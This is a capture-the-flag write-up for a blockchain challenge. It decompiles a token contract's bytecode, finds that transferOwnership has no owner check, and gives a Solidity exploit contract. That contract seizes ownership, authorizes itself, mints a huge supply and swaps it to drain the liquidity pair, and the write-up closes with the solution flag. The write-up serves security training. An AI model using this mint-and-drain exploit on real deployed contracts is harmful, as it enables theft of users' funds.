# Challenge 04 : Now this is real life [7 solves] [499 points] [First blood 🩸]

```
lol but sir, why would we show you the sources ? An attacker won't have them ..
A friend of mine told me recently "Oh this BB scope has web3, you should check it out !".
They gave him as much info as i'm giving you now. gl, hf

Oh, you have to empty the contract (< 0.5 WMEL you know the drill by now)
```

This challenge is also the same as 2nd and 3rd challenge, except the minting process

Also, this time the source code for the challenge contract is not provided

So we can just get the runtime bytecode with foundry cast :

```
# cast code 0xf2a04DA19CcC127b072F543E9DF48F252100f9AD --rpc-url http://62.171.185.249:8502/
0x608060405234801561001057600080fd5b50600436106101215760003560e01c806395d89b41116100ad578063dd62ed3e11610071578063dd62ed3e1461031c578063eb5a662e1461034c578063f0b37c041461037c578063f2fde38b14610398578063fe9fbb80146103b457610121565b806395d89b41146102665780639b96eece14610284578063a0712d68146102b4578063a9059cbb146102d0578063b6a5d7de1461030057610121565b80632f54bf6e116100f45780632f54bf6e146101c2578063313ce567146101f257806342966c681461021057806370a082311461022c578063715018a61461025c57610121565b806306fdde0314610126578063095ea7b31461014457806318160ddd1461017457806323b872dd14610192575b600080fd5b61012e6103e4565b60405161013b9190610faa565b60405180910390f35b61015e60048036038101906101599190611065565b610472565b60405161016b91906110c0565b60405180910390f35b61017c610564565b60405161018991906110ea565b60405180910390f35b6101ac60048036038101906101a79190611105565b61056a565b6040516101b991906110c0565b60405180910390f35b6101dc60048036038101906101d79190611158565b610688565b6040516101e991906110c0565b60405180910390f35b6101fa6106e1565b60405161020791906111a1565b60405180910390f35b61022a600480360381019061022591906111bc565b6106f4565b005b61024660048036038101906102419190611158565b610814565b60405161025391906110ea565b60405180910390f35b61026461082c565b005b61026e6108ef565b60405161027b9190610faa565b60405180910390f35b61029e60048036038101906102999190611158565b61097d565b6040516102ab91906110ea565b60405180910390f35b6102ce60048036038101906102c991906111bc565b6109c6565b005b6102ea60048036038101906102e59190611065565b610ae6565b6040516102f791906110c0565b60405180910390f35b61031a60048036038101906103159190611158565b610c03565b005b610336600480360381019061033191906111e9565b610ca5565b60405161034391906110ea565b60405180910390f35b61036660048036038101906103619190611158565b610cca565b60405161037391906110ea565b60405180910390f35b61039660048036038101906103919190611158565b610d50565b005b6103b260048036038101906103ad9190611267565b610df3565b005b6103ce60048036038101906103c99190611158565b610ec4565b6040516103db91906110c0565b60405180910390f35b600580546103f1906112c3565b80601f016020809104026020016040519081016040528092919081815260200182805461041d906112c3565b801561046a5780601f1061043f5761010080835404028352916020019161046a565b820191906000526020600020905b81548152906001019060200180831161044d57829003601f168201915b505050505081565b600081600460003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060008573ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020819055508273ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff167f8c5be1e5ebec7d5bd14f71427d1e84f3dd0314c0f7b2291e5b200ac8c7c3b9258460405161055291906110ea565b60405180910390a36001905092915050565b60025481565b600081600360008673ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060008282546105bb9190611323565b9250508190555081600360008573ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060008282546106119190611357565b925050819055508273ffffffffffffffffffffffffffffffffffffffff168473ffffffffffffffffffffffffffffffffffffffff167fddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef8460405161067591906110ea565b60405180910390a3600190509392505050565b60008060009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168273ffffffffffffffffffffffffffffffffffffffff16149050919050565b600760009054906101000a900460ff1681565b6106fd33610ec4565b61073c576040517f08c379a0000000000000000000000000000000000000000000000000000000008152600401610733906113d7565b60405180910390fd5b80600360003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020600082825461078b9190611323565b9250508190555080600260008282546107a49190611323565b92505081905550600073ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff167fddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef8360405161080991906110ea565b60405180910390a350565b60036020528060005260406000206000915090505481565b61083533610688565b610874576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040161086b90611443565b60405180910390fd5b60008060006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff1602179055507f04dba622d284ed0014ee4b9a6a68386be1a4c08a4913ae272de89199cc68616360006040516108e59190611472565b60405180910390a1565b600680546108fc906112c3565b80601f0160208091040260200160405190810160405280929190818152602001828054610928906112c3565b80156109755780601f1061094a57610100808354040283529160200191610975565b820191906000526020600020905b81548152906001019060200180831161095857829003601f168201915b505050505081565b6000600360008373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020549050919050565b6109cf33610ec4565b610a0e576040517f08c379a0000000000000000000000000000000000000000000000000000000008152600401610a05906113d7565b60405180910390fd5b80600360003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020016000206000828254610a5d9190611357565b925050819055508060026000828254610a769190611357565b925050819055503373ffffffffffffffffffffffffffffffffffffffff16600073ffffffffffffffffffffffffffffffffffffffff167fddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef83604051610adb91906110ea565b60405180910390a350565b600081600360003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020016000206000828254610b379190611323565b9250508190555081600360008573ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020016000206000828254610b8d9190611357565b925050819055508273ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff167fddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef84604051610bf191906110ea565b60405180910390a36001905092915050565b610c0c33610688565b610c4b576040517f08c379a0000000000000000000000000000000000000000000000000000000008152600401610c4290611443565b60405180910390fd5b60018060008373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060006101000a81548160ff02191690831515021790555050565b6004602052816000526040600020602052806000526040600020600091509150505481565b6000600460003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060008373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020549050919050565b610d5933610688565b610d98576040517f08c379a0000000000000000000000000000000000000000000000000000000008152600401610d8f90611443565b60405180910390fd5b6000600160008373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060006101000a81548160ff02191690831515021790555050565b806000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555060018060008373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060006101000a81548160ff0219169083151502179055507f04dba622d284ed0014ee4b9a6a68386be1a4c08a4913ae272de89199cc68616381604051610eb991906114ec565b60405180910390a150565b6000600160008373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060009054906101000a900460ff169050919050565b600081519050919050565b600082825260208201905092915050565b60005b83811015610f54578082015181840152602081019050610f39565b60008484015250505050565b6000601f19601f8301169050919050565b6000610f7c82610f1a565b610f868185610f25565b9350610f96818560208601610f36565b610f9f81610f60565b840191505092915050565b60006020820190508181036000830152610fc48184610f71565b905092915050565b600080fd5b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b6000610ffc82610fd1565b9050919050565b61100c81610ff1565b811461101757600080fd5b50565b60008135905061102981611003565b92915050565b6000819050919050565b6110428161102f565b811461104d57600080fd5b50565b60008135905061105f81611039565b92915050565b6000806040838503121561107c5761107b610fcc565b5b600061108a8582860161101a565b925050602061109b85828601611050565b9150509250929050565b60008115159050919050565b6110ba816110a5565b82525050565b60006020820190506110d560008301846110b1565b92915050565b6110e48161102f565b82525050565b60006020820190506110ff60008301846110db565b92915050565b60008060006060848603121561111e5761111d610fcc565b5b600061112c8682870161101a565b935050602061113d8682870161101a565b925050604061114e86828701611050565b9150509250925092565b60006020828403121561116e5761116d610fcc565b5b600061117c8482850161101a565b91505092915050565b600060ff82169050919050565b61119b81611185565b82525050565b60006020820190506111b66000830184611192565b92915050565b6000602082840312156111d2576111d1610fcc565b5b60006111e084828501611050565b91505092915050565b60008060408385031215611200576111ff610fcc565b5b600061120e8582860161101a565b925050602061121f8582860161101a565b9150509250929050565b600061123482610fd1565b9050919050565b61124481611229565b811461124f57600080fd5b50565b6000813590506112618161123b565b92915050565b60006020828403121561127d5761127c610fcc565b5b600061128b84828501611252565b91505092915050565b7f4e487b7100000000000000000000000000000000000000000000000000000000600052602260045260246000fd5b600060028204905060018216806112db57607f821691505b6020821081036112ee576112ed611294565b5b50919050565b7f4e487b7100000000000000000000000000000000000000000000000000000000600052601160045260246000fd5b600061132e8261102f565b91506113398361102f565b9250828203905081811115611351576113506112f4565b5b92915050565b60006113628261102f565b915061136d8361102f565b9250828201905080821115611385576113846112f4565b5b92915050565b7f21415554484f52495a4544000000000000000000000000000000000000000000600082015250565b60006113c1600b83610f25565b91506113cc8261138b565b602082019050919050565b600060208201905081810360008301526113f0816113b4565b9050919050565b7f214f574e45520000000000000000000000000000000000000000000000000000600082015250565b600061142d600683610f25565b9150611438826113f7565b602082019050919050565b6000602082019050818103600083015261145c81611420565b9050919050565b61146c81610ff1565b82525050565b60006020820190506114876000830184611463565b92915050565b6000819050919050565b60006114b26114ad6114a884610fd1565b61148d565b610fd1565b9050919050565b60006114c482611497565b9050919050565b60006114d6826114b9565b9050919050565b6114e6816114cb565b82525050565b600060208201905061150160008301846114dd565b9291505056fea26469706673582212202de2db797b481ad820af2bf75ca53b2cd7aaddcd48683c2d771cd2c70a732a2964736f6c63430008110033
```

Then we can decompile it with this : 

https://library.dedaub.com/decompile

```
// Decompiled by library.dedaub.com
// 2023.05.13 07:57 UTC
// Compiled using the solidity compiler version 0.8.17


// Data structures and variables inferred from the use of storage instructions
mapping (uint256 => uint256) _isAuthorized; // STORAGE[0x1]
uint256 _totalSupply; // STORAGE[0x2]
mapping (uint256 => uint256) _balanceOf; // STORAGE[0x3]
mapping (uint256 => mapping (uint256 => uint256)) _getAllowance; // STORAGE[0x4]
uint256[] _name; // STORAGE[0x5]
uint256[] _symbol; // STORAGE[0x6]
uint256 _isOwner; // STORAGE[0x0] bytes 0 to 19
uint256 _decimals; // STORAGE[0x7] bytes 0 to 0


// Events
Approval(address, address, uint256);
Transfer(address, address, uint256);

function name() public payable { 
    v0 = 0x12c3(_name.length);
    v1 = new bytes[](v0);
    v2 = v3 = v1.data;
    v4 = 0x12c3(_name.length);
    if (v4) {
        if (31 < v4) {
            v5 = v6 = _name.data;
            do {
                MEM[v2] = STORAGE[v5];
                v5 += 1;
                v2 += 32;
            } while (v3 + v4 <= v2);
        } else {
            MEM[v3] = _name.length >> 8 << 8;
        }
    }
    v7 = new array[](v1.length);
    v8 = v9 = 0;
    while (v8 < v1.length) {
        v7[v8] = v1[v8];
        v8 = v8 + 32;
    }
    v7[v1.length] = 0;
    return v7;
}

function 0x12c3(uint256 varg0) private { 
    v0 = v1 = varg0 >> 1;
    if (!(varg0 & 0x1)) {
        v0 = v2 = v1 & 0x7f;
    }
    require((varg0 & 0x1) - (v0 < 32), Panic(34)); // access to incorrectly encoded storage byte array
    return v0;
}

function _SafeSub(uint256 varg0, uint256 varg1) private { 
    require(varg0 - varg1 <= varg0, Panic(17)); // arithmetic overflow or underflow
    return varg0 - varg1;
}

function _SafeAdd(uint256 varg0, uint256 varg1) private { 
    require(varg0 <= varg0 + varg1, Panic(17)); // arithmetic overflow or underflow
    return varg0 + varg1;
}

function approve(address varg0, uint256 varg1) public payable { 
    require(4 + (msg.data.length - 4) - 4 >= 64);
    require(varg0 == varg0);
    require(varg1 == varg1);
    _getAllowance[msg.sender][varg0] = varg1;
    emit Approval(msg.sender, varg0, varg1);
    return bool(1);
}

function () public payable { 
    revert();
}

function totalSupply() public payable { 
    return _totalSupply;
}

function transferFrom(address varg0, address varg1, uint256 varg2) public payable { 
    require(4 + (msg.data.length - 4) - 4 >= 96);
    require(varg0 == varg0);
    require(varg1 == varg1);
    require(varg2 == varg2);
    v0 = _SafeSub(_balanceOf[varg0], varg2);
    _balanceOf[varg0] = v0;
    v1 = _SafeAdd(_balanceOf[varg1], varg2);
    _balanceOf[varg1] = v1;
    emit Transfer(varg0, varg1, varg2);
    return bool(1);
}

function isOwner(address varg0) public payable { 
    require(4 + (msg.data.length - 4) - 4 >= 32);
    require(varg0 == varg0);
    return bool(address(varg0) == _isOwner);
}

function decimals() public payable { 
    return _decimals;
}

function burn(uint256 varg0) public payable { 
    require(4 + (msg.data.length - 4) - 4 >= 32);
    require(varg0 == varg0);
    require(uint8(_isAuthorized[address(address(msg.sender))]), Error('!AUTHORIZED'));
    v0 = _SafeSub(_balanceOf[msg.sender], varg0);
    _balanceOf[msg.sender] = v0;
    v1 = _SafeSub(_totalSupply, varg0);
    _totalSupply = v1;
    emit Transfer(msg.sender, address(0x0), varg0);
}

function balanceOf(address varg0) public payable { 
    require(4 + (msg.data.length - 4) - 4 >= 32);
    require(varg0 == varg0);
    return _balanceOf[varg0];
}

function renounceOwnership() public payable { 
    require(msg.sender == _isOwner, Error('!OWNER'));
    _isOwner = 0;
    emit 0x4dba622d284ed0014ee4b9a6a68386be1a4c08a4913ae272de89199cc686163(address(0x0));
}

function symbol() public payable { 
    v0 = 0x12c3(_symbol.length);
    v1 = new bytes[](v0);
    v2 = v3 = v1.data;
    v4 = 0x12c3(_symbol.length);
    if (v4) {
        if (31 < v4) {
            v5 = v6 = _symbol.data;
            do {
                MEM[v2] = STORAGE[v5];
                v5 += 1;
                v2 += 32;
            } while (v3 + v4 <= v2);
        } else {
            MEM[v3] = _symbol.length >> 8 << 8;
        }
    }
    v7 = new array[](v1.length);
    v8 = v9 = 0;
    while (v8 < v1.length) {
        v7[v8] = v1[v8];
        v8 = v8 + 32;
    }
    v7[v1.length] = 0;
    return v7;
}

function getBalanceOf(address varg0) public payable { 
    require(4 + (msg.data.length - 4) - 4 >= 32);
    require(varg0 == varg0);
    return _balanceOf[varg0];
}

function mint(uint256 varg0) public payable { 
    require(4 + (msg.data.length - 4) - 4 >= 32);
    require(varg0 == varg0);
    require(uint8(_isAuthorized[address(address(msg.sender))]), Error('!AUTHORIZED'));
    v0 = _SafeAdd(_balanceOf[msg.sender], varg0);
    _balanceOf[msg.sender] = v0;
    v1 = _SafeAdd(_totalSupply, varg0);
    _totalSupply = v1;
    emit Transfer(address(0x0), msg.sender, varg0);
}

function transfer(address varg0, uint256 varg1) public payable { 
    require(4 + (msg.data.length - 4) - 4 >= 64);
    require(varg0 == varg0);
    require(varg1 == varg1);
    v0 = _SafeSub(_balanceOf[msg.sender], varg1);
    _balanceOf[msg.sender] = v0;
    v1 = _SafeAdd(_balanceOf[varg0], varg1);
    _balanceOf[varg0] = v1;
    emit Transfer(msg.sender, varg0, varg1);
    return bool(1);
}

function authorize(address varg0) public payable { 
    require(4 + (msg.data.length - 4) - 4 >= 32);
    require(varg0 == varg0);
    require(msg.sender == _isOwner, Error('!OWNER'));
    _isAuthorized[varg0] = 0x1 | bytes31(_isAuthorized[address(address(varg0))]);
}

function allowance(address varg0, address varg1) public payable { 
    require(4 + (msg.data.length - 4) - 4 >= 64);
    require(varg0 == varg0);
    require(varg1 == varg1);
    return _getAllowance[varg0][varg1];
}

function getAllowance(address varg0) public payable { 
    require(4 + (msg.data.length - 4) - 4 >= 32);
    require(varg0 == varg0);
    return _getAllowance[msg.sender][varg0];
}

function unauthorize(address varg0) public payable { 
    require(4 + (msg.data.length - 4) - 4 >= 32);
    require(varg0 == varg0);
    require(msg.sender == _isOwner, Error('!OWNER'));
    _isAuthorized[varg0] = 0x0 | bytes31(_isAuthorized[address(address(varg0))]);
}

function transferOwnership(address varg0) public payable { 
    require(4 + (msg.data.length - 4) - 4 >= 32);
    require(varg0 == varg0);
    _isOwner = varg0;
    _isAuthorized[varg0] = 0x1 | bytes31(_isAuthorized[address(address(varg0))]);
    emit 0x4dba622d284ed0014ee4b9a6a68386be1a4c08a4913ae272de89199cc686163(varg0);
}

function isAuthorized(address varg0) public payable { 
    require(4 + (msg.data.length - 4) - 4 >= 32);
    require(varg0 == varg0);
    return bool(uint8(_isAuthorized[address(address(varg0))]));
}

// Note: The function selector is not present in the original solidity code.
// However, we display it for the sake of completeness.

function __function_selector__(bytes4 function_selector) public payable { 
    MEM[64] = 128;
    require(!msg.value);
    if (msg.data.length < 4) {
        ();
    } else if (0x95d89b41 > function_selector >> 224) {
        if (0x2f54bf6e > function_selector >> 224) {
            if (0x6fdde03 == function_selector >> 224) {
                name();
            } else if (0x95ea7b3 == function_selector >> 224) {
                approve(address,uint256);
            } else if (0x18160ddd == function_selector >> 224) {
                totalSupply();
            } else {
                require(0x23b872dd == function_selector >> 224);
                transferFrom(address,address,uint256);
            }
        } else if (0x2f54bf6e == function_selector >> 224) {
            isOwner(address);
        } else if (0x313ce567 == function_selector >> 224) {
            decimals();
        } else if (0x42966c68 == function_selector >> 224) {
            burn(uint256);
        } else if (0x70a08231 == function_selector >> 224) {
            balanceOf(address);
        } else {
            require(0x715018a6 == function_selector >> 224);
            renounceOwnership();
        }
    } else if (0xdd62ed3e > function_selector >> 224) {
        if (0x95d89b41 == function_selector >> 224) {
            symbol();
        } else if (0x9b96eece == function_selector >> 224) {
            getBalanceOf(address);
        } else if (0xa0712d68 == function_selector >> 224) {
            mint(uint256);
        } else if (0xa9059cbb == function_selector >> 224) {
            transfer(address,uint256);
        } else {
            require(0xb6a5d7de == function_selector >> 224);
            authorize(address);
        }
    } else if (0xdd62ed3e == function_selector >> 224) {
        allowance(address,address);
    } else if (0xeb5a662e == function_selector >> 224) {
        getAllowance(address);
    } else if (0xf0b37c04 == function_selector >> 224) {
        unauthorize(address);
    } else if (0xf2fde38b == function_selector >> 224) {
        transferOwnership(address);
    } else {
        require(0xfe9fbb80 == function_selector >> 224);
        isAuthorized(address);
    }
}
```

The mint() function will check if we are authorized, otherwise revert :

```
function mint(uint256 varg0) public payable { 
    require(4 + (msg.data.length - 4) - 4 >= 32);
    require(varg0 == varg0);
    require(uint8(_isAuthorized[address(address(msg.sender))]), Error('!AUTHORIZED'));
    v0 = _SafeAdd(_balanceOf[msg.sender], varg0);
    _balanceOf[msg.sender] = v0;
    v1 = _SafeAdd(_totalSupply, varg0);
    _totalSupply = v1;
    emit Transfer(address(0x0), msg.sender, varg0);
}
```

We can authorize ourselves with authorize(), but it checks if we are the owner :

```
function authorize(address varg0) public payable { 
    require(4 + (msg.data.length - 4) - 4 >= 32);
    require(varg0 == varg0);
    require(msg.sender == _isOwner, Error('!OWNER'));
    _isAuthorized[varg0] = 0x1 | bytes31(_isAuthorized[address(address(varg0))]);
}
```

There is a transferOwnership() function, however it does not check if we are the current owner, so we can use this to become the owner :

```
function transferOwnership(address varg0) public payable { 
    require(4 + (msg.data.length - 4) - 4 >= 32);
    require(varg0 == varg0);
    _isOwner = varg0;
    _isAuthorized[varg0] = 0x1 | bytes31(_isAuthorized[address(address(varg0))]);
    emit 0x4dba622d284ed0014ee4b9a6a68386be1a4c08a4913ae272de89199cc686163(varg0);
}
```

So in order to mint tokens, we can first become owner with transferOwnership(), then authorize ourselves with authorize(), then finally call mint() to mint tokens

```solidity
pragma solidity ^0.8.0;

interface Router {
    function swapExactTokensForTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);
}

contract chall4_solve {
    constructor(address chall4, address router, address wmei) public {
        chall4.call(abi.encodeWithSignature("transferOwnership(address)", address(this)));
        chall4.call(abi.encodeWithSignature("authorize(address)", address(this)));
        chall4.call(abi.encodeWithSignature("mint(uint256)", 999999999999 ether));
        chall4.call(abi.encodeWithSignature("approve(address,uint256)", router, type(uint256).max));
        address[] memory path = new address[](2);
        path[0] = chall4;
        path[1] = wmei;
        Router(router).swapExactTokensForTokens(999999999999 ether, 0, path, address(this), type(uint256).max);
    }
}
```

The verification of this challenge has the same issue as the last challenge, even the pair has less than 0.5 WMEI, someimtes it will show verification fail, because sometimes the WMEI contract is token0 in the pair and sometimes it's token1, it has to be in token1 in order for the verification to work

So, just deploy the challenge again and deploy the solve contract until it can verify correctly

Flag :
```
Hero{S0_Ur_4_r3AL_hUnT3r_WP_YMI!!!}
```